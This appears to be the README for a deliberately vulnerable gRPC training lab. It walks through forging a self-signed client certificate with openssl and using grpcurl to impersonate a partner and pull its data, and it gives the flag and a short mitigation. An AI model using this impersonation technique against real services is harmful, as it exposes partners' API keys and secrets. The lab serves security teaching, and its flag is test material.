# Lab 004: Arbitrary mTLS

## Vulnerability
Partner API accepts any client certificate, allowing attackers to impersonate trusted partners.

## Objective
Generate a fake client certificate and access partner data to capture the flag.

## Run the Lab
```bash
# Build and run
docker build -t grpc-004 .
docker run -p 8004:8004 grpc-004
```

## Exploit

### Step 1: Generate a fake client certificate
```bash
# Generate client private key
openssl genrsa -out client.key 2048

# Generate client certificate signing request
openssl req -new -key client.key -out client.csr -subj "/CN=FakePartner/O=AttackerCorp"

# Generate self-signed client certificate
openssl x509 -req -in client.csr -signkey client.key -out client.crt -days 365
```

### Step 2: Use the fake certificate to access partner data
```bash
# Install grpcurl
go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest

# Connect using the fake client certificate
grpcurl -proto partner.proto -insecure -cert client.crt -
key client.key -d '{
  "partner_id": "FAKE_PARTNER",
  "data_type": "all"
}' localhost:8004 partner.PartnerAPI/GetPartnerData 
```

## Impact
Attackers can impersonate any partner and access sensitive API keys and secrets.

## Flag
Successfully access partner data to get: `GRPC_GOAT{arbitrary_mtls_bypasses_partner_auth}`

## Mitigation
Implement proper certificate validation with a trusted CA and certificate pinning.